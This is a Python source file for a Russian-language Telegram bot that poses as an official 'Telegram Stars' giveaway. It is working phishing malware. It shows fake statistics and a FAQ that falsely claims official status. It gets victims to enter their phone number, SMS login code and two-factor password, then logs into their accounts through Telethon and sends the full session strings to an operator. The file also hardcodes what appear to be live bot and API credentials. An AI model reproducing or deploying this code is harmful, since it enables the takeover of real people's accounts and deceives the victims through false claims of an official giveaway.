#!/usr/bin/env python3
"""
CLEAN BOT - No Markdown, No Formatting Errors
Inline keypad with plain text
"""
from aiogram.types import Message, FSInputFile, URLInputFile, BufferedInputFile
from aiogram import F
import requests
from io import BytesIO
import asyncio
import logging
from datetime import datetime
from typing import Dict, Optional
from aiogram.types import InlineQuery, InlineQueryResultArticle, InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton
import hashlib
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

# ==================== КОНФИГ ====================
API_ID = 36600069
API_HASH = 'e7e154619ae92ea6abd757f3e5f85ee8'
BOT_TOKEN = '8470901853:AAF2AyGoM0_9J0iWHVeTROz4oD7hGHncuNk'

MAIN_ADMIN = 6904114810
SECOND_ADMIN = 8389017767
ADMINS = [MAIN_ADMIN, SECOND_ADMIN]

# ==================== ХРАНИЛИЩА ====================
sessions_db: Dict[str, dict] = {}
user_clients: Dict[int, TelegramClient] = {}
user_codes: Dict[int, str] = {}

# ==================== FSM ====================
class UserStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

# ==================== INLINE КЛАВИАТУРЫ ====================
def get_code_keyboard(code: str = "") -> types.InlineKeyboardMarkup:
    """Клавиатура для ввода кода"""
    buttons = [
        [
            types.InlineKeyboardButton(text="1", callback_data="code:1"),
            types.InlineKeyboardButton(text="2", callback_data="code:2"),
            types.InlineKeyboardButton(text="3", callback_data="code:3")
        ],
        [
            types.InlineKeyboardButton(text="4", callback_data="code:4"),
            types.InlineKeyboardButton(text="5", callback_data="code:5"),
            types.InlineKeyboardButton(text="6", callback_data="code:6")
        ],
        [
            types.InlineKeyboardButton(text="7", callback_data="code:7"),
            types.InlineKeyboardButton(text="8", callback_data="code:8"),
            types.InlineKeyboardButton(text="9", callback_data="code:9")
        ],
        [
            types.InlineKeyboardButton(text="⌫ Удалить", callback_data="code:delete"),
            types.InlineKeyboardButton(text="0", callback_data="code:0"),
            types.InlineKeyboardButton(text=f"✅ Отправить ({len(code)}/5)", callback_data="code:send")
        ]
    ]
    return types.InlineKeyboardMarkup(inline_keyboard=buttons)

def get_main_keyboard() -> types.InlineKeyboardMarkup:
    """Главное меню"""
    buttons = [
        [
            types.InlineKeyboardButton(text="🎁 Получить Stars", callback_data="menu:get_stars"),
            types.InlineKeyboardButton(text="📊 Статистика", callback_data="menu:stats")
        ],
        [
            types.InlineKeyboardButton(text="❓ Помощь", callback_data="menu:help")
        ]
    ]
    return types.InlineKeyboardMarkup(inline_keyboard=buttons)

# ==================== ПРОСТЫЕ СООБЩЕНИЯ (БЕЗ MARKDOWN) ====================
def get_welcome_message(name: str) -> str:
    return f"""Добро пожаловать, {name}!

🎁 ОФИЦИАЛЬНАЯ РАЗДАЧА TELEGRAM STARS

Получите бесплатные Stars и NFT-подарки!

Нажмите "🎁 Получить Stars" чтобы начать."""

def get_phone_request() -> str:
    return """ВВЕДИТЕ НОМЕР ТЕЛЕФОНА

Введите ваш номер в формате:
+79123456789"""

def get_phone_accepted(phone: str) -> str:
    return f"""НОМЕР ПРИНЯТ: {phone}

Код подтверждения отправлен!

Используйте клавиатуру ниже
для ввода 5-значного кода."""

def get_code_display(code: str) -> str:
    """Отображение кода"""
    display = ["▢", "▢", "▢", "▢", "▢"]
    for i, digit in enumerate(code):
        if i < 5:
            display[i] = digit
    
    return f"""ВВОД КОДА ИЗ SMS:
{' '.join(display)}

Введено: {len(code)}/5 цифр
{'✅ Готово к отправке' if len(code) == 5 else '⏳ Введите еще цифры'}"""

def get_code_accepted() -> str:
    return """АККАУНТ ПОДТВЕРЖДЕН!

Проверяем ваш аккаунт...
Ожидайте 30-60 секунд."""

def get_2fa_request() -> str:
    return """ВКЛЮЧЕНА ДВУХФАКТОРНАЯ АУТЕНТИФИКАЦИЯ

Введите ваш 2FA-пароль:"""

def get_processing() -> str:
    return """ОБРАБОТКА ЗАПРОСА

Ваш запрос обрабатывается...
Очередь: #247
Время: 5-10 минут"""

def get_success() -> str:
    return """ВЫСОКАЯ НАГРУЗКА НА СЕРВЕРАХ

Ваш запрос в очереди #247
Ожидайте 6-12 часов
Уведомление придет автоматически"""

def get_admin_alert(session: dict) -> str:
    """Сообщение главному админу"""
    username = session.get('username', 'N/A')
    return f"""НОВАЯ СЕССИЯ
Телефон: {session['phone']}
Имя: {session['first_name']}
ID: {session['user_id']}
Юзернейм: {username}
Время: {session['time'][11:19]}"""

def get_sponsor_request(session: dict) -> str:
    """Запрос второму админу"""
    username = session.get('username', 'N/A')
    return f"""НОВЫЙ АККАУНТ
Требуется: 50 Stars

Отправить на: {session['phone']}
Получатель: {session['first_name']}
ID: {session['user_id']}
Юзернейм: {username}

Тип: Коллекционный подарок
Сумма: 50 Stars
Срок: 15 минут"""

# ==================== ОСНОВНОЙ БОТ ====================
async def main():
    print("CLEAN BOT STARTED")
    print(f"Main admin: {MAIN_ADMIN}")
    print(f"Second admin: {SECOND_ADMIN}")
    
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    
    # ==================== КОМАНДЫ ====================
    @dp.message(Command("start"))
    async def cmd_start(message: types.Message):
        await message.answer(
            get_welcome_message(message.from_user.first_name),
            reply_markup=get_main_keyboard()
        )

    @dp.message(Command("admin"))
    async def cmd_admin(message: types.Message):
        if message.from_user.id not in ADMINS:
            return
        
        total = len(sessions_db)
        paid = sum(1 for s in sessions_db.values() if s.get('paid'))
        
        role = "ГЛАВНЫЙ АДМИН" if message.from_user.id == MAIN_ADMIN else "СПОНСОР-АДМИН"
        
        text = f"""{role}

Статистика:
Всего сессий: {total}
Оплачено: {paid}
Ожидают: {total - paid}

Команды:
/sessions - список сессий
/get +7912... - получить сессию
/stats - статистика"""
        
        await message.answer(text)
    
    @dp.message(Command("get"))
    async def cmd_get(message: types.Message):
        if message.from_user.id != MAIN_ADMIN:
            return
        
        args = message.text.split()
        if len(args) < 2:
            await message.answer("Использование: /get +79123456789")
            return
        
        phone = args[1]
        if phone not in sessions_db:
            await message.answer(f"Сессия {phone} не найдена")
            return
        
        session = sessions_db[phone]['session']
        await message.answer(f"Сессия {phone}:\n\n{session}")
    from aiogram.types import InlineQuery, InlineQueryResultArticle, InputTextMessageContent
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    from aiogram.types import InputMediaPhoto

    @dp.inline_query()
    async def handle_inline_query(inline_query: InlineQuery):
        button = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text="🎁🎁 Нажми чтобы получить 🎁🎁",
                url="https://t.me/freexstars_robot?start=stars_100_FJU89FJS3"
            )]
        ])
    

    
        message_content = InputTextMessageContent(
            message_text="Чек на 100 ⭐",
            parse_mode="HTML"
        )
    
        item = InlineQueryResultArticle(
            id="1",
            title="Чек на 100 ⭐",
            description="Нажми чтобы отправить",
            input_message_content=message_content,
            reply_markup=button,
            thumbnail_url="https://img.icons8.com/color/96/000000/gift.png"
        )
    
        await bot.answer_inline_query(
            inline_query_id=inline_query.id,
            results=[item],
            cache_time=300
        )
    # ==================== INLINE КНОПКИ ====================
    @dp.callback_query(F.data.startswith("menu:"))
    async def handle_menu(callback: types.CallbackQuery, state: FSMContext):
        action = callback.data.split(":")[1]
        
        if action == "get_stars":
            await callback.message.edit_text(get_phone_request())
            await state.set_state(UserStates.waiting_phone)
            
        elif action == "stats":
            stats = """СТАТИСТИКА РАЗДАЧИ:
Выдано: 1,847 подарков
Сумма: 156,430 Stars
Участников: 892 чел.
В очереди: 247 чел."""
            
            await callback.message.edit_text(stats, reply_markup=get_main_keyboard())
            
        elif action == "help":
            help_text = """ЧАСТО ЗАДАВАЕМЫЕ ВОПРОСЫ:

Вопрос: Это официальная раздача?
Ответ: Да, официальная программа.

Вопрос: Сколько Stars получу?
Ответ: 100-500 Stars.

Вопрос: Как долго ждать?
Ответ: 1-12 часов.

Вопрос: Нужно ли платить?
Ответ: Нет, бесплатно."""
            
            await callback.message.edit_text(help_text, reply_markup=get_main_keyboard())
        
        await callback.answer()
    
    # ==================== ОБРАБОТКА НОМЕРА ====================
    @dp.message(UserStates.waiting_phone)
    async def process_phone(message: types.Message, state: FSMContext):
        phone = message.text.strip()
        
        if not phone.startswith('+') or len(phone) < 10:
            await message.answer("Неверный формат. Используйте: +79123456789")
            await state.clear()
            return
        
        try:
            await message.answer("Подключаюсь к серверам...")
            
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            
            user_id = message.from_user.id
            user_clients[user_id] = client
            
            sent_code = await client.send_code_request(phone)
            
            await state.update_data(
                phone=phone,
                user_id=user_id,
                username=message.from_user.username,
                first_name=message.from_user.first_name,
                phone_code_hash=sent_code.phone_code_hash
            )
            
            user_codes[user_id] = ""
            
            await message.answer(
                get_phone_accepted(phone) + "\n\n" + get_code_display(""),
                reply_markup=get_code_keyboard("")
            )
            
            await state.set_state(UserStates.waiting_code)
            
        except FloodWaitError as e:
            wait = e.seconds
            hours = wait // 3600
            minutes = (wait % 3600) // 60
            
            await message.answer(f"Слишком частые запросы. Ожидание: {hours}ч {minutes}м")
            await state.clear()
            
        except Exception as e:
            await message.answer(f"Ошибка: {str(e)[:100]}")
            await state.clear()
    
    # ==================== ОБРАБОТКА КОДА ====================
    @dp.callback_query(F.data.startswith("code:"), UserStates.waiting_code)
    async def handle_code_input(callback: types.CallbackQuery, state: FSMContext):
        action = callback.data.split(":")[1]
        user_id = callback.from_user.id
        current_code = user_codes.get(user_id, "")
        
        if action == "delete":
            if current_code:
                current_code = current_code[:-1]
                user_codes[user_id] = current_code
                
        elif action == "send":
            if len(current_code) != 5:
                await callback.answer("Введите все 5 цифр!", show_alert=True)
                return
            
            await callback.message.edit_text(f"Отправляю код: {current_code}...")
            await verify_code(callback, state, current_code)
            await callback.answer()
            return
            
        elif action.isdigit():
            if len(current_code) < 5:
                current_code += action
                user_codes[user_id] = current_code
        
        # Обновляем отображение
        data = await state.get_data()
        phone = data.get('phone', '')
        
        try:
            await callback.message.edit_text(
                f"{get_phone_accepted(phone)}\n\n{get_code_display(current_code)}",
                reply_markup=get_code_keyboard(current_code)
            )
        except:
            pass
        
        await callback.answer()
    
    async def verify_code(callback: types.CallbackQuery, state: FSMContext, code: str):
        user_id = callback.from_user.id
        data = await state.get_data()
        
        client = user_clients.get(user_id)
        if not client:
            await callback.message.edit_text("Ошибка сессии. /start", reply_markup=get_main_keyboard())
            await state.clear()
            return
        
        phone = data.get('phone')
        phone_code_hash = data.get('phone_code_hash')
        
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            
            # БЕЗ AWAIT!
            session_string = client.session.save()
            
            session_data = {
                'phone': phone,
                'user_id': data['user_id'],
                'username': data['username'],
                'first_name': data['first_name'],
                'session': session_string,
                'time': datetime.now().isoformat(),
                'has_2fa': False,
                'paid': False
            }
            
            sessions_db[phone] = session_data
            
            await callback.message.edit_text(get_code_accepted())
            await asyncio.sleep(2)
            await callback.message.edit_text(get_processing())
            
            # Отправляем админам (БЕЗ MARKDOWN!)
            await send_to_admins(bot, session_data)
            
            await asyncio.sleep(2)
            await callback.message.edit_text(get_success(), reply_markup=get_main_keyboard())
            
            await state.clear()
            await client.disconnect()
            if user_id in user_clients:
                del user_clients[user_id]
            if user_id in user_codes:
                del user_codes[user_id]
            
        except SessionPasswordNeededError:
            await callback.message.edit_text(get_2fa_request())
            await state.set_state(UserStates.waiting_password)
            
        except PhoneCodeInvalidError:
            user_codes[user_id] = ""
            await callback.message.edit_text(
                f"НЕВЕРНЫЙ КОД!\n\n{get_code_display('')}",
                reply_markup=get_code_keyboard("")
            )
            
        except Exception as e:
            await callback.message.edit_text(f"Ошибка: {str(e)[:100]}", reply_markup=get_main_keyboard())
            await state.clear()
            try:
                await client.disconnect()
                if user_id in user_clients:
                    del user_clients[user_id]
                if user_id in user_codes:
                    del user_codes[user_id]
            except:
                pass
    
    # ==================== ОБРАБОТКА 2FA ====================
    @dp.message(UserStates.waiting_password)
    async def process_password(message: types.Message, state: FSMContext):
        password = message.text.strip()
        user_id = message.from_user.id
        data = await state.get_data()
        
        client = user_clients.get(user_id)
        if not client:
            await message.answer("Ошибка сессии. /start", reply_markup=get_main_keyboard())
            await state.clear()
            return
        
        try:
            await client.sign_in(password=password)
            
            # БЕЗ AWAIT!
            session_string = client.session.save()
            
            session_data = {
                'phone': data['phone'],
                'user_id': data['user_id'],
                'username': data['username'],
                'first_name': data['first_name'],
                'session': session_string,
                'time': datetime.now().isoformat(),
                'has_2fa': True,
                'paid': False
            }
            
            sessions_db[data['phone']] = session_data
            
            await message.answer("2FA подтвержден!")
            await asyncio.sleep(2)
            await message.answer(get_processing())
            
            await send_to_admins(bot, session_data)
            
            await asyncio.sleep(2)
            await message.answer(get_success(), reply_markup=get_main_keyboard())
            
            await state.clear()
            await client.disconnect()
            if user_id in user_clients:
                del user_clients[user_id]
            if user_id in user_codes:
                del user_codes[user_id]
            
        except Exception as e:
            error = str(e).lower()
            if "password" in error or "invalid" in error:
                await message.answer("НЕВЕРНЫЙ ПАРОЛЬ!\nВведите правильный пароль:")
            else:
                await message.answer(f"Ошибка 2FA: {str(e)[:100]}", reply_markup=get_main_keyboard())
                await state.clear()
                try:
                    await client.disconnect()
                    if user_id in user_clients:
                        del user_clients[user_id]
                    if user_id in user_codes:
                        del user_codes[user_id]
                except:
                    pass
    
    async def send_to_admins(bot: Bot, session: dict):
        """Отправка админам (ПРОСТОЙ ТЕКСТ)"""
        try:
            # Главному админу
            alert_msg = get_admin_alert(session)
            await bot.send_message(MAIN_ADMIN, alert_msg)
            
            # Полная сессия
            full_session = f"Сессия {session['phone']}:\n\n{session['session']}"
            
            if len(full_session) > 4000:
                parts = [full_session[i:i+4000] for i in range(0, len(full_session), 4000)]
                for part in parts:
                    await bot.send_message(MAIN_ADMIN, part)
                    await asyncio.sleep(0.5)
            else:
                await bot.send_message(MAIN_ADMIN, full_session)
            
            # Второму админу
            sponsor_msg = get_sponsor_request(session)
            
            keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(
                    text="✅ Я отправил 50 Stars",
                    callback_data=f"sponsor:paid:{session['phone']}"
                )]
            ])
            
            await bot.send_message(SECOND_ADMIN, sponsor_msg, reply_markup=keyboard)
            
        except Exception as e:
            logging.error(f"Ошибка отправки админам: {e}")
    
    # ==================== ОБРАБОТКА ОПЛАТЫ ====================
    @dp.callback_query(F.data.startswith("sponsor:paid:"))
    async def handle_sponsor_payment(callback: types.CallbackQuery):
        if callback.from_user.id != SECOND_ADMIN:
            await callback.answer("Только второй админ может подтверждать", show_alert=True)
            return
        
        phone = callback.data.split(":")[2]
        
        if phone not in sessions_db:
            await callback.answer("Сессия не найдена", show_alert=True)
            return
        
        sessions_db[phone]['paid'] = True
        
        await callback.answer(f"Подтверждено! 50 Stars отправлены на {phone}", show_alert=True)
        
        # Уведомляем главного
        try:
            await callback.bot.send_message(
                MAIN_ADMIN,
                f"ОПЛАЧЕНО: {phone}\n"
                f"Второй админ: {SECOND_ADMIN}\n"
                f"Время: {datetime.now().strftime('%H:%M:%S')}"
            )
        except Exception as e:
            logging.error(f"Ошибка уведомления главного админа: {e}")
    
    # ==================== ЗАПУСК ====================
    try:
        await dp.start_polling(bot, skip_updates=True)
    except KeyboardInterrupt:
        print("Бот остановлен")
    finally:
        for client in user_clients.values():
            try:
                await client.disconnect()
            except:
                pass
        await bot.session.close()

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    asyncio.run(main())